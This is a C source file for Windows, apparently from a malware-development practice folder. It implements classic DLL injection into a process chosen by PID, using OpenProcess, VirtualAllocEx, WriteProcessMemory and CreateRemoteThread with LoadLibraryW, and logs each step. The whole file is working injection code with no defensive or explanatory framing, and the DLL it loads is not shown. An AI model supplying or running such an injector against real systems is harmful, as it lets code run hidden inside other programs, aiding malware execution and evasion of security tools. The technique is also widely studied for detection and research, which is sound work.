#include<Windows.h>
#include<stdio.h>

const char* successLog = "[+] Success: ";
const char* infoLog = "[*] Info: ";
const char* errorLog = "[-] Error: ";

DWORD processID, threadID = NULL;
LPVOID remoteBuffer = NULL;
HMODULE kernel32handle = NULL;
HANDLE processHandle, threadHandle = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\atabe\\OneDrive\\Documents\\MalDev\\DLLinjection.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {

    // Argument check - give a friendly usage message if needed
    if (argc < 2) {
        printf("%s Usage: %s <Process ID>\n", errorLog, argv[0]);
        return EXIT_FAILURE;
    }

    processID = atoi(argv[1]);
    printf("%s Targeting process with ID: %ld\n", infoLog, processID);

    // Try to get a handle to the process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);

    // If we fail to get a handle, log an error and bail out
    if (processHandle == NULL) {
        printf("%s Couldn't open process (%ld). Error: %ld\n", errorLog, processID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Successfully got a handle to the process (0x%p)\n", successLog, processHandle);

    remoteBuffer = VirtualAllocEx(processHandle, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    printf("%s Allocated buffer to process memory with RW permissions\n", successLog);

    if (remoteBuffer == NULL) {
        printf("%s Couldn't create remote buffer (%ld). Error: %ld\n", errorLog, processID, GetLastError());
        return EXIT_FAILURE;
    }

    WriteProcessMemory(processHandle, remoteBuffer, dllPath, dllPathSize, NULL);
    printf("%s wrote [%S] to process memory\n", successLog, dllPath);

    kernel32handle = GetModuleHandleW(L"kernel32");

    if (kernel32handle == NULL) {
        printf("%s failed to get a handle to kernel32.dll. Error: %ld\n", errorLog, GetLastError());
        CloseHandle(processHandle);
        return EXIT_FAILURE;
    }

    printf("%s Successfully got a handle to the kernel32.dll (0x%p)\n", successLog, kernel32handle);

    LPTHREAD_START_ROUTINE startit = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32handle, "LoadLibraryW");
    printf("%s Successfully got the address of LoadLibraryW() (0x%p)\n", successLog, startit);

    threadHandle = CreateRemoteThread(processHandle, NULL, 0, startit, remoteBuffer, 0, &threadID);

    if (threadHandle == NULL) {
        printf("%s Failed to create a remote thread. Error: %ld\n", errorLog, GetLastError());
        CloseHandle(processHandle);
        return EXIT_FAILURE;
    }

    printf("%s Remote thread created successfully with ID: %ld\n", successLog, threadID);

    // Wait for the thread to finish execution
    printf("%s Waiting for the remote thread to finish execution...\n", infoLog);
    WaitForSingleObject(threadHandle, INFINITE);
    printf("%s Remote thread finished executing\n", successLog);

    // Clean up handles
    CloseHandle(threadHandle);
    CloseHandle(processHandle);

    return EXIT_SUCCESS;
}